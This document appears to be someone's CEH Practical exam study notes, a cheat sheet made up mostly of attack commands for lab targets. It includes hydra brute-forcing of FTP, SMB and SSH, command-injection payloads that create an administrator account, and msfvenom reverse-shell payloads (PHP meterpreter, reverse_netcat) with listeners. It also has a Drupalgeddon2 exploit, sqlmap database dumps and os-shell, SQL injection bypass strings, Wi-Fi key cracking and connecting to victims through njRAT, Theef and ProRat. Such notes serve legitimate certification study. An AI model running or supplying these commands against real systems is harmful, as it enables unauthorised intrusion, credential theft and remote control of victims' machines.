# My ceh practical notes




#  Scanning Networks (always do sudo su) --> To be root
```
1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
9- nmap --script smb-os-discovery -p 445 <DC-IP-Address>

10-#for detailed information,  domain information. Run the following commands:
nmap --script ldap-rootdse -p 389 <DC_IP>
ldapsearch -x -h <DC_IP> -s base "(objectClass=*)" operatingSystemVersion
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP>

11-#for detailed vulnerability info:
nmap -Pn - -script vuln (IP OR RANGE)     // https://www.cvedetails.com/cve/CVE-NNNN-NNNN for details

12-#for detailed PORTS
nmap -T4 -A -p 80,443 (IP OR RANGE) 
nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.0/24

13- Enumerate Web server info using nmap-  

nmap -sV --script=http-enum www.movies.com

14- Check ports SMB

nmap -p 139,445 -sV 192.168.x.x/2x

```
# Enumeration
```
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4- DNS recon/enum-  dnsrecon -d www.google.com -z
5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
```
#  Quick Overview (Stegnography) --> Snow , Openstego
```
1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)  
2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content) -> snow.exe -C -p “password” file.txt
3- Image Stegnography using Openstego- PRACTICE ??

CrypTool : Encode/Decode Text (File Extension is .hex)
File → Open → Encrypt/Decrypt → Symmetric (Modern) → RC2 → KEY 05 → Decrypt

stegsnow -p password -C file.txt output.txt
cat output.txt | base64 -d

steghide extract -sf FILE
cat SECRET.txt
#Using Binwalk to Extract Hidden Data:
binwalk --dd='.*' FILE.jpg
```
```
#  Sniffing
```
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10


EXAMPLE 
Brute force FTP with hydra
hydra -l user -P passlist.txt ftp://10.10.10.10

Brute force SMB with hydra
hydra -l USER_NAME -P password_file TARGET_IP smb

Brute force SSH with hydra
hydra -L username_file -P password_file TARGET_IP ssh



To connect to the SMB share and retrieve files.

smbclient -L (IP or range)

smbclient //target_ip/ -U USER_NAME 
get file.txt  or  get file.txt ~/Desktop/file.txt or more file.txt

```
#  Hacking Web Application
```
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.

```bash
Directory traversal after dirsearch or gobuster or dirb or dirbuster
dirsearch -u https://example.com
or 
dirsearch -e php,html,js,txt -u https://example.com -> for extension search
or
dirsearch -e php,html,js,txt -u https://example.com -w /usr/share/wordlists/dirb/common.txt -> for wordlist search

---
1. Scan the target with Zap to find the vulnerability. Then exploit it. It can be file upload/ File inclusion
vulnerability on DVWA.
2. msfconsole in one tab && next in a new tab
3. msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php
4. >use exploit/multi/handler or use 30
5. >set payload php/meterpreter/reverse_tcp
6. Set LHOST <ip>
7. Upload a file you created as exploit.php
8. Open terminal and type run once you get url type url in brower you get meterpreter session then type ls
get the files.


msfconsole
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOST xx.xx.xx.xx
set RPORT 80
run
```
#  SQL Injections
```
1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version


1. now in parrot os, open firefox and login into the website given and details.
2. Go to profile and and right cleck and inspect and console type “document.cookie” you will get one value.
3. Open the terminal and type the below commands to get the password of other user.
4. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs
5. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0"
-D moveiscope – -tables
6. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0"
-D moviescope -T user-Login – -dump
7. You will get all the Useraname and Passwords of the website.

```bash
#Get all databases using sqlmap
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
#Get tables from a selected database_name
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name --tables 
#Get all columns from a selected table_name in the database_name
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T table_name --columns
#Dump the data from the columns 
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T table_name -C column_name --dump
```


sqlmap -u "http://test.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" --dump
sqlmap -u "http://test.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" --dbs
sqlmap -u "http://test.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name --tables
sqlmap -u "http://test.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name -T users --columns
sqlmap -u "http://test.com/search.php?q=test" --cookie="PHPSESSID=your_
session_id" -D database_name -T users -C username,password --dump



sqlmap -u "http://xxx.xxx.xx.xx" --crawl=3 --level=5 --risk=3 --dbs
sqlmap -u "http://xxx.xxx.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -
T table_name -C Flag --dump
```
# Android
```
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
5 adb pull /sdcard/FOLDER/ or adb pull /sdcard/FOLDER attacker/home/

# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials
Also

ip.src!=xxx.xx.xx.xx && ip.dst == xxx.xx.xx.xx
Statistics -> Conversations -> IPv4
#Click on the Packets column headerto sort conversations by packet count
```

# Cracking Wi-Fi networks
```
Cracking Wifi Password
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
aircrack-ng -b [Target BSSID] -w ‘/home/wifipass.txt’ ‘/home/wireless.cap’




```bash
#Use airodump-ng to list the wireless networks captured in the W!F!_Pcap.cap file:
airodump-ng xxxxx!_Pcap.cap
#Note down the BSSID MAC address of the target network and the channel it's operating on
#Start capturing traffic on the target network to collect data packets: 
#Replace BSSID and CHANNEL
airodump-ng --bssid BSSID --channel CHANNEL -w outputfile W!F!_Pcap.cap

aircrack-ng -w /path/to/wordlist.txt xxxx-01.cap
aircrack-ng path/xxxx-01.cap file #copy the key
aircrack-ng -b 98:48:35:97:49 /usr/share/wordlists/rockyou.txt /path/xxxx-01.cap
```
#  Some extra work 
```
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
```

#  IMPORTANT PORTS

21 FTP
139,445 SMB
3389 RDP
25,80,110,143 MERCURY
3306 MYSQL

#  REGULAR EXPRESSIONS AND PROGRAMS
find extensions of files

find / -name "*.txt"

find / -type f -iname "flag1.txt" 2>/dev/null: find the file named "flag1.txt" case insensitive under / and not showing output errors
find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size
find / -type f -name FILE.txt 2> /dev/null


file explorer in windows CMD
dir /b/s "file*"



entropy

ent -h or apt install ent
ent evil.elf

#CIFRADO, PROGRAMAS,EXTRA

ESCALAR PRIVILEGIOS VERTICALMENTE
https://gtfobins.github.io/ - ./bash -p

Identify malware entry point address
[PEiD](https://softfamous.com/peid/)    OR PEView tool


DIE - Identify PT_LOAD entry 
https://www.majorgeeks.com/mg/get/detect_it_easy,2.html#google_vignette


hashes.com/en/decrypt/hash
4. hash-identifier paste the text and see the type of hash and then hashcat -h | grep MD5
5. hashcat -m 0 hash.txt /Desktop/word list/urser.txt

Cifrado 384SHA
apt install sha384sum
sha384sum file1`

CRC32
https://emn178.github.io/online-tools/crc32_checksum.html
crc32 FILE

cat FILE.txt | base64 -d


Choose a Hash Cracking Tool:
Select a hash cracking tool like John the Ripper, Hashcat, or another suitable tool for the hash algorithm used in the file.

Use the chosen hash cracking tool with the wordlist to attempt to crack the password hash.
For example, if using John the Ripper, you might run a command like:

john --format=raw-MD5 --wordlist=/path/wordlist.txt SECRET.txt


# EXPLOIT

10. msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444 and copy the path go to target machine
after login paste now find . -name flag.txt
11. start listen nc -lnvp 444
12. password type

# IOT AND IOT HACKING

Open the .pcap file with wireshark
Type “MQTT” in the filter bar and press enter
Look for MQTT publish messages in the packet list. 
MQTT publish messages typically have a PUBLISH message type.
Get the message length

Look through the filtered packetsto find an MQTT Publish Message.Each
MQTT Publish message has a topic associated with it.
Once you locate an MQTT Publishmessage, examine the topic field
The topic length is the number of characters or bytesthatmake up the topic string.
If, forinstance, you find an MQTT Publishmessage with a topic length of 9 characters,

#RAT

look for port 5552/9871 and use njRAT or theef rat
#### ProRat

* Execute ProRat
* Set victim IP and relative port 5110
* Click to connect and search files.

#### Theef

* Execute Theef
* Set victim IP and relative ports to 6703 and 2968 (or custom port)
* Click to connect and open file manger.

#### **NjRat**

* Execute NjRat
* Insert IP and Port
* Click on manager and open directory 

---
1. Scan all ports with nmap (-p-). Look for the unknown ports. Use theef RAT to connect to it.
2. main ports check 9871,6703
3. nmap -p 9871,6703 192.168.0.0/24
4. now you get open port ip address
5. now go to the c drive malware/trojans/rat/theef and run the client.exe file
6. now entry the ip of open port and click connect

```